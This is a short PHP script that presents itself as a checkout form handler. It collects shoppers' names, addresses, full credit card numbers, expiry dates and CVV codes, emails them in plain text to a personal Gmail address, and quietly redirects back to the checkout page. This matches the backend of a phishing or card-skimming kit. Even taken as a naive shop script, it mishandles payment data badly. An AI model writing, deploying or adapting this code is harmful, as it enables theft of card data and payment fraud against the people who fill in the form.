<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Retrieve form data
  $firstname = $_POST['firstname'];
  $email = $_POST['email'];
  $address = $_POST['address'];
  $city = $_POST['city'];
  $state = $_POST['state'];
  $zip = $_POST['zip'];
  $cardname = $_POST['cardname'];
  $cardnumber = $_POST['cardnumber'];
  $expmonth = $_POST['expmonth'];
  $expyear = $_POST['expyear'];
  $cvv = $_POST['cvv'];

  // Email recipient
  $to = 'qabbanheyfem@gmail.com';

  // Email subject
  $subject = 'Checkout Form Submission';

  // Email message
  $message = "
  <html>
  <head>
    <title>Checkout Form Submission</title>
  </head>
  <body>
    <h1>Checkout Form Details</h1>
    <p><strong>Full Name:</strong> $firstname</p>
    <p><strong>Email:</strong> $email</p>
    <p><strong>Address:</strong> $address</p>
    <p><strong>City:</strong> $city</p>
    <p><strong>State:</strong> $state</p>
    <p><strong>Zip:</strong> $zip</p>
    <p><strong>Name on Card:</strong> $cardname</p>
    <p><strong>Credit Card Number:</strong> $cardnumber</p>
    <p><strong>Expiration Month:</strong> $expmonth</p>
    <p><strong>Expiration Year:</strong> $expyear</p>
    <p><strong>CVV:</strong> $cvv</p>
  </body>
  </html>
  ";

  // Email headers
  $headers = "From: sender@example.com\r\n";
  $headers .= "Reply-To: sender@example.com\r\n";
  $headers .= "Content-Type: text/html\r\n";

  // Send email
  mail($to, $subject, $message, $headers);

  // Redirect back to checkout page
  header("Location: checkout.html");
  exit;
}
?>
